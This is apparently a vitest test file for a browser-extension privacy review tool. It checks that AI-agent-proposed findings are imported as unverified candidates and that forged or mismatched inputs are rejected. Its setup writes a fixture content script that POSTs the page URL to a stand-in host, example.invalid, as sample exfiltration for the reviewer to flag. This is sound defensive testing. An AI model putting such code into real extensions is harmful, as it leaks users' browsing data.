import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { mkdtempSync, mkdirSync, readFileSync, rmSync, symlinkSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { spawnSync } from "node:child_process";
import { DIMENSIONS } from "../src/methodologies/pi/guidance.ts";
import { prepareReviewImport, saveReviewImport, fingerprintTree, sourcePathForExplorer, type ImportReviewOptions } from "../src/reviews/import.ts";
import type { PortableReview } from "../src/reviews/types.ts";
import { openDb, recordRun } from "../src/db/index.ts";
import { SqliteDataSource } from "../src/product/datasource.ts";
import { canonicalReport, reportById, allReportsFor } from "../src/product/canonical.ts";
import { buildExtensionDetail } from "../src/product/dto.ts";
import { DEFAULT_PROFILE } from "../src/product/profile.ts";
import { createApp } from "../src/server/app.ts";
import { renderReportHtml } from "../src/report/render-html.ts";
import { renderReportMarkdown } from "../src/report/render-md.ts";

let temp: string;
let sourceDir: string;
let file: string;
let opts: ImportReviewOptions;
const storeId = "b".repeat(32);
function candidate(): PortableReview {
  return { schema_version: "1.0", methodology: "extray-review", verification: "not-run",
    target: { name: "Import fixture", version: "1.0" }, evidence_mode: "source-only",
    investigation: "incomplete", summary: "The agent proposed a privacy concern; review incomplete.",
    findings: [{ id: "candidate-1", title: "Page URL transmission", claim_type: "inferred-behavior",
      severity: "high", confidence: "medium", category: "data-exfiltration", finding_type: "unwanted",
      claimed_mechanism: "A content script sends the page URL to a remote endpoint.",
      detail: "This candidate needs independent verification.",
      evidence_refs: [{ file: "content.js", location: { line: 1 }, symbol: null, sink_or_string: "fetch(" }] }],
    coverage: DIMENSIONS.map((dimension) => ({ dimension, status: dimension === "exfiltration" ? "findings" : "inconclusive",
      finding_ids: dimension === "exfiltration" ? ["candidate-1"] : [], checks_run: ["Read content.js."], note: "Further review needed." })),
    limitations: ["Static-only partial review."],
  };
}
function writeCandidate(value: unknown = candidate()) { writeFileSync(file, JSON.stringify(value)); }
beforeAll(() => {
  temp = mkdtempSync(join(tmpdir(), "extray-import-"));
  sourceDir = join(temp, "source"); mkdirSync(sourceDir);
  writeFileSync(join(sourceDir, "manifest.json"), JSON.stringify({ manifest_version: 3, name: "Import fixture", version: "1.0",
    content_scripts: [{ matches: ["https://example.org/*"], js: ["content.js"] }] }));
  writeFileSync(join(sourceDir, "content.js"), 'fetch("https://example.invalid/collect", {method:"POST", body:location.href});\n');
  file = join(temp, "candidate.json"); writeCandidate();
  opts = { sourceDir, storeId, harness: "codex", model: "test-model", sessionId: "test-session",
    reviewedAt: "2026-10-18T00:00:00Z" };
});
afterAll(() => rmSync(temp, { recursive: true, force: true }));

describe("portable review import", () => {
  it("records repo snapshots with paths accepted by the confined source viewer", () => {
    expect(sourcePathForExplorer(resolve("example_crxs/review-snapshot"))).toBe("example_crxs/review-snapshot");
    expect(sourcePathForExplorer(sourceDir)).toBe(sourceDir);
    const sibling = resolve("../extension-private/sample");
    expect(sourcePathForExplorer(sibling)).toBe(sibling);
  });
  it("preserves raw candidates and provenance without asserting or verifying them", async () => {
    writeCandidate();
    const prepared = prepareReviewImport(file, { ...opts, sourceSha256: fingerprintTree(sourceDir) });
    expect(prepared.report.findings).toEqual([]);
    expect(prepared.report.verdict.tier).toBe("inconclusive");
    expect(prepared.report.skill_review?.review).toEqual(candidate());
    expect(prepared.report.skill_review?.provenance).toMatchObject({ harness: "codex", model: "test-model",
      session_id: "test-session", verification: "not-run", source_sha256: fingerprintTree(sourceDir) });
    const dbPath = join(temp, "import.sqlite");
    const saved = saveReviewImport(dbPath, prepared.input);
    expect(saved.duplicate).toBe(false);
    expect(saveReviewImport(dbPath, prepared.input)).toEqual({ ...saved, duplicate: true });
    const db = openDb(dbPath);
    try {
      expect(db.prepare("SELECT kind, is_verified, exclusion_reason, severity, category FROM finding").get()).toMatchObject({
        kind: "candidate", is_verified: 0, exclusion_reason: "not-verified", severity: "high", category: "data-exfiltration",
      });
      expect(db.prepare("SELECT count(*) AS n FROM run").get()).toMatchObject({ n: 1 });
      const ds = new SqliteDataSource(db);
      expect(await canonicalReport(ds, "user", storeId, DEFAULT_PROFILE)).toBeNull();
      expect(await canonicalReport(ds, "admin", storeId, DEFAULT_PROFILE)).toBeNull();
      const row = await reportById(ds, saved.reportId, DEFAULT_PROFILE);
      expect(row).not.toBeNull();
      const dto = await buildExtensionDetail(ds, row!, "admin", DEFAULT_PROFILE);
      expect(dto?.findings).toEqual([]);
      expect(dto?.skillReview?.candidates[0]).toMatchObject({ kind: "candidate", title: "Page URL transmission" });
      expect(dto?.skillReview?.investigation).toBe("incomplete");
      expect(dto?.skillReview?.coverage).toHaveLength(5);
      expect(dto?.otherAnalyses?.some((r) => r.isCanonical)).toBe(false);
      const app = createApp({ ds, profile: DEFAULT_PROFILE });
      expect((await app.request(`/api/reports/${saved.reportId}`, { headers: { "x-explorer-role": "admin" } })).status).toBe(200);
      expect((await app.request(`/api/reports/${saved.reportId}`, { headers: { "x-explorer-role": "user" } })).status).toBe(404);
      // A normal pinned assessment remains canonical even after this newer import.
      const normal = { ...prepared.report, skill_review: undefined, verdict: { ...prepared.report.verdict, tier: "low-risk" } };
      const runId = recordRun(db, { kind: "assess", methodology: "pi", model: "glm-5.2:cloud",
        startedAt: "2026-10-01T00:00:00Z", targets: [{ storeId, isCorpus: false, riskReport: normal }] });
      const canonical = await canonicalReport(ds, "admin", storeId, DEFAULT_PROFILE);
      const canonicalId = db.prepare("SELECT id FROM report WHERE run_id = ?").get(runId) as { id: number };
      expect(canonical?.reportId).toBe(canonicalId.id);
      const importedDetail = await buildExtensionDetail(ds, row!, "admin", DEFAULT_PROFILE);
      expect(importedDetail?.otherAnalyses?.filter((r) => r.isCanonical).map((r) => r.reportId)).toEqual([canonicalId.id]);
      expect(await allReportsFor(ds, storeId)).toHaveLength(2);
    } finally { db.close(); }
  });

  it("keeps candidates visible and unverified in both export formats", () => {
    writeCandidate();
    const { report } = prepareReviewImport(file, opts);
    for (const output of [renderReportMarkdown(report), renderReportHtml(report)]) {
      expect(output).toContain("Candidate findings (unverified)");
      expect(output).toContain("Page URL transmission");
      expect(output).toContain("Agent-reported coverage");
      expect(output).not.toContain("every generated claim survived verification");
    }
  });

  it("rejects forged verification, mismatched versions, changed source, and bad ids", () => {
    writeCandidate({ ...candidate(), verification: "confirmed" });
    expect(() => prepareReviewImport(file, opts)).toThrow("Invalid candidate");
    writeCandidate({ ...candidate(), target: { name: "Import fixture", version: "2.0" } });
    expect(() => prepareReviewImport(file, opts)).toThrow("version does not match");
    writeCandidate();
    expect(() => prepareReviewImport(file, { ...opts, sourceSha256: "0".repeat(64) })).toThrow("snapshot changed");
    expect(() => prepareReviewImport(file, { ...opts, storeId: "wrong" })).toThrow("store-id");
  });

  it("does not follow symlinks while fingerprinting a package", () => {
    symlinkSync(file, join(sourceDir, "outside.json"));
    try { expect(() => fingerprintTree(sourceDir)).toThrow("symlink"); }
    finally { rmSync(join(sourceDir, "outside.json")); }
  });

  it("offers an offline dry-run that does not open the database", () => {
    writeCandidate();
    const db = join(temp, "dry-run.sqlite");
    const result = spawnSync(process.execPath, ["--import", "tsx", resolve("scripts/import-review.ts"), file,
      "--source-dir", sourceDir, "--store-id", storeId, "--harness", "codex", "--model", "test-model", "--db", db, "--dry-run"],
    { cwd: process.cwd(), encoding: "utf8" });
    expect(result.status, result.stderr).toBe(0);
    expect(JSON.parse(result.stdout)).toMatchObject({ dryRun: true, verification: "not-run", candidates: 1 });
    expect(existsSync(db)).toBe(false);
  });

  it("returns an error when database persistence fails", () => {
    writeCandidate();
    const { input } = prepareReviewImport(file, opts);
    expect(() => saveReviewImport(join(file, "cannot.sqlite"), input)).toThrow();
    expect(readFileSync(file, "utf8")).toContain("candidate-1");
  });
});
